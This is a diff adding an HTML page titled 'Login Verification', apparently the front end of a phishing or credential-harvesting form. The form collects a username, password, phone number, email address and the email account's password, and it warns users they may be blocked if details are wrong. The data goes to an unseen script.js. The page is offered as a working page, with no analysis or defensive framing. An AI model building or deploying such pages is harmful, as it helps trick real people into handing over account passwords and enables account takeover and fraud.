@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Verification</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Login Verification</h2>
+        <p class="subtitle">⚠ Please fill the form correctly. If you enter wrong details, you may be blocked from this app.</p>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <input type="tel" id="phone" placeholder="Phone Number" required>
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="emailPassword" placeholder="Email Password" required>
+            <button type="submit">Verify & Send</button>
+        </form>
+        <p id="responseMessage"></p>
+        <p class="bottom-text">Made By ABHINAV/p> <!-- Added this line -->
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
